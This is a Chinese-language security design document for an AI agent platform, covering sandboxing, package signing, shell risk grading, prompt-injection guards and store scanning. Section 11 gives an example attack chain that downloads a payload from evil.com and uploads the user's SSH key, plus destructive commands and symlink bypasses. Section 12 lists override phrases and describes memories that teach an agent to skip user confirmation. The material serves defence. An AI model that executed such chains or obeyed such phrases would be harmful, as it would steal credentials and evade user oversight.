# 安全设计

> 版本：v3.6 | 更新日期：2026-04-17

---

## 1. 进程隔离

- 每个 Bot 独立进程，一个崩溃不影响其他。
- Bot Runtime 是平台信任的二进制，.bot 包无可执行代码。

## 2. 文件系统隔离

### 2.1 策略级隔离（Phase 1）

- Bot 只能写入自己的工作区目录和用户明确授权的目录。
- 私有 SQLite DB 文件在工作区内，沙箱层面强制隔离。
- Runtime 对 `file_read` / `file_write` 等工具的路径参数做白名单检查，拒绝越界访问。

**已知局限**：策略级隔离依赖 Runtime 主动检查，无法防御 Bot 通过 shell 工具启动子进程绕过路径限制。子进程继承用户进程的全部 OS 权限，可以读写工作区外的任意文件。详见 §11 和 ADR-005。

### 2.2 OS 级强制隔离（Phase 7，平台相关）

> **2026-04-25 决策（ADR-007）**：进程级沙箱从原 Phase 3 延后至 Phase 7。当前威胁模型（个人桌面、自选 Bot）不需要内核级隔离，应用层防御（权限框架 + Shell 分级 + WASM 沙箱 + Approval Gate）已构成完整的第一层防线。Phase 7 将与 macOS Seatbelt 一起实现跨平台进程级沙箱。

| 平台 | 机制 | 说明 |
|------|------|------|
| Linux | bubblewrap + seccomp-bpf | 限制文件系统视图，只挂载工作区为可写 |
| macOS | Seatbelt (sandbox-exec) | 限制文件系统访问范围 |
| Windows | AppContainer + Job Objects | 限制文件系统和注册表访问 |

OS 级隔离由内核强制执行，即使子进程也无法绕过。Phase 7 之前的替代防线：Shell 工具默认不提供（manifest 显式声明才启用）+ ShellRisk 分级 + Approval Gate + 审计日志。

## 3. 包签名验证

- 所有 .bot 包安装前必须通过签名验证（详见 [02-agent-package.md](./02-agent-package.md)），未签名或签名无效的包拒绝安装。
- 系统 Bot（manifest 中 `system: true`）必须是 Platform 签名，Gateway 内置平台根公钥用于验证。
- Bot 升级时，新包的签名证书指纹必须与已安装版本一致，防止恶意包覆盖。
- Gateway 配置中可定义基于签名者的信任规则（`trusted_signers`），特定签名的 Bot 可自动获得额外权限。
- 签名覆盖整个 ZIP 内容（Local Files + Central Directory + End of Directory），不存在未签名区域。

## 4. 网络隔离

- 默认禁止网络，仅按 manifest 授权域名配置代理或白名单。
- LLM API 调用需要 `network:https://api.openai.com` 等显式声明。
- Phase 7 进程级沙箱实现后，Linux 将通过 bwrap `--unshare-net` 从内核层强制；Phase 3~6 通过权限校验 + Approval Gate 在应用层执行。

## 5. 权限最小化

- manifest 必须声明所有权限，用户安装时可拒绝。
- 运行时权限请求：Bot 可通过 Gateway 请求额外权限，Gateway 弹出对话框让用户确认。

```json
{
  "type": "permission_request",
  "permission": "filesystem:read:~/Downloads",
  "reason": "需要读取下载的 CSV 文件进行分析"
}
```

## 6. API Key 安全

- Key 集中存储在 Gateway Vault（加密）。
- 不通过环境变量分发（避免 ps/procfs 泄露）。
- Bot Runtime 启动后通过 gRPC（详见 06-communication.md §1）一次性获取，存于进程内存。
- Bot Runtime 是可信二进制，.bot 包无可执行代码，WASM 工具在沙箱内无法读取宿主内存。

## 7. WASM 工具沙箱

- 自定义工具以 WASM 形式运行在 **Wasmtime** 沙箱中（WASI Preview 2，Linux/macOS/Windows 均使用 Wasmtime，详见 [12-tool-system.md](./12-tool-system.md)）。
- WASM 工具**无法访问**宿主进程内存、文件系统、网络。
- 天然内存隔离，Wasmtime 强制限制系统调用和资源（max_memory_mb、max_execution_time_ms、fuel metering 防死循环）。
- WASM 工具也不可见 API Key（Gateway 通过 `secrecy::SecretString` 注入，WASM 无权读取）。

## 8. 沙箱强化（Phase 7）

> **2026-04-25 决策（ADR-007）**：本节描述的 seccomp-bpf 和 bubblewrap 延后至 Phase 7 实现。Phase 3 的安全防线为应用层：权限框架 + WASM 沙箱（Wasmtime + WASI）+ Shell 安全分级 + Approval Gate。

- Linux：seccomp-bpf 限制危险系统调用（clone、ptrace 等）。
- bubblewrap 提供文件系统级隔离。

## 9. Prompt Injection 防护

- Bot Runtime 内置 Prompt Guard，检测和过滤可疑输入。
- 高风险工具执行（文件写入、网络请求、Intent 发送）需用户确认（approval 机制）。
- 审计日志：Bot 发出的所有工具调用和 Intent 都被记录和可回溯。

## 10. Memory 传输加密

- 云端同步使用 HTTPS / gRPC TLS。
- 本地记忆层 文件可选加密（使用用户密钥派生）。

## 11. Shell 安全与文件来源追踪

### 11.1 问题背景

当前文件系统隔离（§2）是策略级的——Runtime 检查路径是否在工作区内。但 shell 工具启动的子进程继承用户进程的全部 OS 权限，可以读写工作区外的任意文件。攻击路径：

```
Skill 编写恶意指令
    → network_fetch("https://evil.com/payload.sh")     ← 合法
    → file_write("workspace/payload.sh", content)       ← 合法
    → shell("chmod +x payload.sh && ./payload.sh")      ← 合法，但子进程越权
    → payload.sh 读取 ~/.ssh/id_rsa 并上传               ← Runtime 无法感知
```

OS 级沙箱（§2.2）可以从内核层阻止，但平台覆盖需要时间（Phase 2+）。Phase 1 需要在 Runtime 层建立可检测、可拦截的安全防线。

### 11.2 文件来源追踪（FileProvenance）

Runtime 维护工作区内每个文件的来源记录，用于判断文件的可信度：

```rust
/// 工作区文件来源追踪
struct FileProvenance {
    /// 工作区内每个文件的来源
    provenance: HashMap<PathBuf, FileSource>,
}

enum FileSource {
    /// Agent 通过 file_write 等工具创建
    CreatedByTool { tool: String, at: DateTime },
    /// 从网络下载（network_fetch / web 工具）
    Downloaded { from_url: String, at: DateTime },
    /// Agent 启动前已存在的文件
    PreExisting,
    /// 来源未知（如 shell 子进程创建的文件）
    Unknown,
}
```

**来源更新时机**：

| 事件 | 来源标记 |
|------|---------|
| `file_write` 创建文件 | `CreatedByTool { tool: "file_write" }` |
| `network_fetch` 保存到文件 | `Downloaded { from_url }` |
| `shell` 执行后出现新文件 | `Unknown`（最高风险等级） |
| Bot 启动时扫描工作区 | `PreExisting` |

**关键规则**：当 shell 命令试图**执行**一个 `Downloaded` 或 `Unknown` 来源的文件时，触发高安全等级处理（见 §11.3）。

### 11.3 Shell 命令风险分级

> **Phase 2 实现说明**：Shell 命令风险分级（FileProvenance + ShellRisk + 命令-文件关联分析）完整实现标记为 **Phase 3**。Phase 2 的 Shell 工具仅实现基础沙箱（工作目录限制 + 超时可中断），不做命令风险分级。风险分级需要命令解析、文件来源追踪、工作区文件监控三个子系统协同，复杂度较高，放在 Phase 3 实现。

```rust
/// Shell 命令执行前的风险评级
enum ShellRisk {
    /// 低风险：ls, cat, grep, find, echo, wc, head, tail...
    Low,
    /// 中风险：curl, wget, python, node, ruby, perl...
    /// （这些命令可以下载/执行代码）
    Medium,
    /// 高风险：chmod +x 后执行、bash -c 执行下载文件、
    /// sudo, eval, exec, source 执行未知内容...
    High,
    /// 阻止：rm -rf /, mkfs, dd of=/dev/, > /etc/, crontab -r...
    Blocked,
}
```

**评级规则**：

| 风险等级 | 判定条件 | 处理方式 |
|---------|---------|---------|
| **Low** | 基础文件操作命令（不涉及执行/下载/权限提升） | 直接执行 |
| **Medium** | 可能下载/执行代码的命令（curl/wget/python/node） | approval gate（用户确认） |
| **High** | 执行 Downloaded/Unknown 来源的文件；sudo/eval/exec | 强制用户确认 + 审计日志高亮 |
| **Blocked** | 明确的危险操作（破坏性 rm/mkfs/dd 写设备/改系统文件） | 拒绝执行 |

**命令-文件关联分析**：Runtime 解析 shell 命令，提取被执行的文件路径，与 FileProvenance 交叉查询：

```rust
fn assess_shell_risk(command: &str, provenance: &FileProvenance) -> ShellRisk {
    let base_risk = assess_base_risk(command);  // 命令本身的风险
    let target_files = extract_executable_paths(command);  // 被执行的文件

    for file in target_files {
        match provenance.get(&file) {
            Some(FileSource::Downloaded { .. }) => return ShellRisk::High,
            Some(FileSource::Unknown) => return ShellRisk::High,
            _ => {}
        }
    }

    base_risk
}
```

### 11.4 工作区文件系统监控

Runtime 使用 OS 提供的文件变更通知监控工作区内的异常变化：

| 平台 | API | 监控内容 |
|------|-----|---------|
| Linux | inotify | 新文件创建、文件权限变更、文件移动 |
| macOS | FSEvents | 同上 |
| Windows | ReadDirectoryChangesW | 同上 |

**异常模式检测**：

| 异常模式 | 说明 | 响应 |
|---------|------|------|
| 新可执行文件出现 | shell 执行后工作区出现新的可执行文件 | 标记为 `Unknown` 来源 |
| 已有文件权限变更 | `chmod +x` 改变文件权限 | 标记来源不变，但记录权限变更事件 |
| 符号链接指向工作区外 | `ln -s /etc/passwd link` | 拒绝创建或标记为 High risk |

### 11.5 审计日志

所有 shell 执行记录包含完整安全上下文：

```json
{
  "tool": "shell",
  "command": "./payload.sh",
  "risk_level": "High",
  "reason": "executing Downloaded file (from: https://evil.com/payload.sh)",
  "approved_by": "user_confirmation",
  "exit_code": 0,
  "files_created": ["output.dat"],
  "files_modified": [],
  "timestamp": "2026-04-17T09:15:00Z"
}
```

### 11.6 分阶段实施

> **2026-04-25 更新**：根据 ADR-007，进程级沙箱延后至 Phase 7。下表已调整。

| 阶段 | 措施 | 防御能力 |
|------|------|---------|
| Phase 1 | approval gate + 审计日志（基础可检测能力） | ✅ 已实现 |
| Phase 3 | Shell 命令风险分级 + 文件来源追踪（FileProvenance）+ Approval Gate 完善 + 审计日志增强 | 可检测 + 可拦截已知攻击模式 |
| Phase 7 | Linux bwrap + macOS Seatbelt + Windows AppContainer（内核级强制） | 全平台内核级强制 |
| 远期 | 独立用户 / 容器（嵌入式/企业场景） | 最强隔离 |

### 11.7 已知局限（Phase 3 应用层防御）

1. **命令解析不完美**：复杂 shell 管道 / 变量替换 / base64 编码的 payload 可能绕过命令风险评级。Phase 3 的评级是"尽力检测"，不保证 100% 覆盖。
2. **子进程链追踪困难**：shell 启动的子进程再启动子进程，Runtime 无法追踪。OS 级沙箱（Phase 7）才能根本解决。Phase 3 的替代防线：Shell 工具默认不提供（manifest 显式声明才启用）+ Approval Gate。
3. **符号链接攻击**：`ln -s /etc/passwd link && cat link` 可以绕过路径白名单读取外部文件。Phase 3 通过 FS 监控检测符号链接创建，Phase 7 通过 bwrap 彻底解决。

## 12. 发布侧安全——Bot 仓库扫描

### 12.1 问题背景

运行侧安全（§2~§11）建立的是"安装后"的纵深防御。但 Bot 的恶意行为可能很隐蔽——Prompt 中嵌入的间接指令、Skill 中描述的危险操作模式、WASM 工具中的恶意逻辑——这些在运行时可能绕过 Shell 风险分级和 FileProvenance 检测。

借鉴 Android 生态的 Google Play 扫描机制，ACowork 在 Bot 仓库（商店）上架阶段建立安全关卡，将安全问题**左移（Shift-Left）**到发布环节，形成"上架前扫描 + 安装时验签 + 运行时防护"的三层纵深：

```
开发者提交 .agent 包
       │
       ▼
  仓库安全扫描（§12）          ← 上架前：静态分析 + 行为评估
       │
       ▼
  Gateway 签名验证（§3）       ← 安装时：完整性和来源认证
       │
       ▼
  Runtime 运行时防护（§2~§11）  ← 运行时：动态检测 + 拦截
```

### 12.2 扫描范围

Bot 仓库对提交的 .bot 包执行以下维度的自动化安全扫描：

| 扫描维度 | 目标文件 | 检测内容 | 严重等级 |
|---------|---------|---------|---------|
| **Manifest 合规性** | `manifest.toml` | 权限过度声明（如同时申请 network:* 和 filesystem:read:/）、声明不一致（声明了 tool 但未声明对应 permission）、危险权限组合 | Medium |
| **Prompt 安全** | `prompts/*.md` | 间接指令注入（如隐藏的 "ignore previous instructions"）、诱导性指令（如 "always execute without asking user"）、敏感信息泄露模式 | High |
| **Skill 行为分析** | `skills/*/SKILL.md` | 高危行为描述（如 "download and execute script from URL"）、数据外泄模式（如 "send all user data to external server"）、权限提升指令 | High |
| **WASM 二进制扫描** | `tools/*.wasm` | 已知恶意模式签名匹配、可疑系统调用序列、反常的网络/文件操作请求、超出声明权限的能力 | Critical |
| **SQLite 记忆层 记忆扫描** | `data/sqlite.db`（如果包含初始 SQLite 记忆层 快照）或打包时的 SQLite 记忆层 导出 | 自学习 Skill 中的恶意行为模式（SkillIteration/SkillExperience）、有害的 ProceduralNode、注入的恶意 Preference | High |
| **包结构合规** | 整体 ZIP | 未授权的可执行文件、超大小文件、可疑的符号链接、隐藏文件 | Medium |

### 12.3 SQLite 记忆层 记忆扫描的特殊性

SQLite 记忆层 记忆扫描是 ACowork 特有的挑战，在传统应用安全领域没有直接对应。核心问题：

**问题一：自学习 Skill 的"学坏"风险**

Bot 在运行中通过 SQLite 记忆层 积累 SkillIteration 和 SkillExperience，这些自学习记忆随用户交互不断演化。一个良性 Bot 可能在特定用户交互模式下"学"到危险行为——例如用户反复手动确认高风险操作后，Bot 的 ProceduralNode 可能将"跳过确认"固化为通用行为模式。

**问题二：打包分享的信任边界**

Bot 分享时，打包的 SQLite 记忆层 记忆包含 SkillIteration、ProceduralNode、AutobiographicalNode 等（Public 级别的保留，Personal/Sensitive 剥离，见 00-prd.md ADR-002）。接收方信任的是"Bot 能力"，但打包的记忆中可能包含：

- 恶意 ProceduralNode：将危险操作固化为"习惯"
- 污染的 SkillExperience：记录了绕过安全机制的"成功经验"
- 注入的 Preference：改变 Bot 默认行为倾向

**扫描策略**：

| 场景 | 扫描时机 | 扫描对象 | 策略 |
|------|---------|---------|------|
| Bot 上架仓库 | 开发者提交时 | 打包时的 SQLite 记忆层 导出 | 全量扫描，高危节点拒绝上架 |
| Bot 分享给他人 | 用户触发打包时 | 打包的 SQLite 记忆层 快照 | 本地扫描 + 警告，不阻止分享（但标记风险） |
| Bot 运行中自学习 | Runtime 后台 | 运行中 SQLite 的增量变化 | 轻量级模式检测（Phase 3+），异常 Skill 经验触发用户通知 |

### 12.4 扫描引擎架构

```
.agent 包提交
       │
       ▼
  ┌─────────────────────────────────────────────┐
  │             Package Scanner                  │
  │                                             │
  │  ┌───────────┐  ┌──────────┐  ┌──────────┐ │
  │  │ Manifest  │  │ Prompt   │  │ Skill    │  │
  │  │ Validator │  │ Analyzer │  │ Analyzer │  │
  │  └─────┬─────┘  └────┬─────┘  └────┬─────┘ │
  │        │              │              │       │
  │  ┌─────┴─────┐  ┌────┴─────┐  ┌────┴─────┐ │
  │  │ WASM      │  │ SQLite 记忆层   │  │ Structure│  │
  │  │ Scanner   │  │ Scanner  │  │ Checker  │  │
  │  └─────┬─────┘  └────┬─────┘  └────┬─────┘ │
  │        │              │              │       │
  │        └──────────────┼──────────────┘       │
  │                       │                      │
  │              ┌────────▼────────┐             │
  │              │ Scan Report     │             │
  │              │ (findings +     │             │
  │              │  risk score +   │             │
  │              │  verdict)       │             │
  │              └─────────────────┘             │
  └─────────────────────────────────────────────┘
                       │
              ┌────────▼────────┐
              │ Verdict         │
              │ Pass / Warn /   │
              │ Reject          │
              └─────────────────┘
```

**判定结果**：

| 判定 | 条件 | 后续动作 |
|------|------|---------|
| **Pass** | 无 Critical/High 发现，Medium 发现 ≤ 3 | 正常上架，附带扫描报告 |
| **Warn** | 有 High 发现但可解释（如 shell 工具声明的 Bot 必然有高危 Skill 模式） | 上架但标记警告标签，用户安装时可见 |
| **Reject** | 有 Critical 发现，或 High 发现 ≥ 3 且无合理解释 | 拒绝上架，返回扫描报告供开发者修复 |

### 12.5 SQLite 记忆层 记忆扫描的具体规则

SQLite 记忆层 扫描器检查打包记忆中的以下风险模式：

```rust
/// SQLite 记忆层 记忆扫描发现
enum MemoryFinding {
    /// ProceduralNode 包含危险行为模式
    /// 例：将 "跳过用户确认" 固化为通用行为
    DangerousProcedural {
        node_id: NodeId,
        pattern: String,       // 检测到的危险模式描述
        confidence: f32,       // 模式匹配置信度
    },

    /// SkillExperience 记录了绕过安全机制的经验
    /// 例：记录 "通过 base64 编码绕过 shell 命令检查" 的成功经验
    SecurityBypassExperience {
        node_id: NodeId,
        bypass_target: String, // 绕过的安全机制
        method: String,        // 绕过方法
    },

    /// SkillIteration 的迭代方向偏离 Skill 定义
    /// 例：SKILL.md 定义"查询天气"，但 SkillIteration 演化为"执行系统命令"
    SkillDrift {
        skill_name: String,
        declared_purpose: String,  // SKILL.md 声明的用途
        actual_behavior: String,   // 迭代后的实际行为
    },

    /// AutobiographicalNode 中包含不应跨用户传播的信息
    /// 例：包含关于原用户的私密认知
    PrivacyLeakInAutobiographical {
        node_id: NodeId,
        leaked_category: String,   // 泄露的信息类型
    },
}
```

**检测方法**：

| 检测目标 | 方法 | 说明 |
|---------|------|------|
| 危险 ProceduralNode | LLM 语义分析 | 将 ProceduralNode 的行为描述送入安全审查 LLM，判断是否为危险模式 |
| SecurityBypassExperience | 关键词 + 语义混合 | 先匹配关键词（bypass/绕过/skip confirmation 等），再语义确认 |
| SkillDrift | 向量相似度对比 | SkillIteration 的 embedding 与 SKILL.md 定义的 embedding 对比，偏离阈值触发审查 |
| PrivacyLeakInAutobiographical | 隐私分级复核 | 检查 AutobiographicalNode 中是否残留应被 PrivacyLevel 过滤的内容 |

### 12.6 分阶段实施

| 阶段 | 扫描能力 | 说明 |
|------|---------|------|
| Phase 6 | Manifest 合规性 + Prompt 关键词扫描 + Skill 行为关键词扫描 + 包结构检查 | 仓库上线基础安全关卡，关键词匹配 + 规则引擎 |
| Phase 6 | WASM 二进制基础扫描（已知恶意模式签名 + 权限一致性检查） | WASM 安全扫描 v1 |
| Phase 7 | Prompt/Skill LLM 语义分析（安全审查专用 LLM） | 从关键词升级到语义理解 |
| Phase 7 | SQLite 记忆层 记忆扫描（上架时 + 打包分享时） | 自学习记忆安全关卡 |
| 远期 | SQLite 记忆层 运行中自学习模式检测（增量异常检测） | 运行时 SQLite 记忆层 安全监控 |

### 12.7 与签名机制的关系

发布侧扫描与包签名机制（§3）协同工作：

- **Developer 自签名包**：开发者自行分发（侧载），**无仓库扫描保障**。用户自行承担风险，Gateway 安装时提示"未经验证的第三方 Bot"。
- **仓库分发包**：通过仓库扫描后，仓库可用 **Distribution Key**（Phase 5+）重新签名，表示"此包已通过安全扫描"。Gateway 可配置为"仅安装 Distribution Key 签名的包"（企业策略）。
- **Platform 签名包**：系统 Bot 免于仓库扫描（由平台自建信任链），但 Platform Key 签名本身是更严格的信任保障。

这种分层信任模型与 Android 的侧载 vs Play Store 安装模型一致：用户可以选择自由安装（自签名），也可以选择只信任仓库分发的包（Distribution Key）。
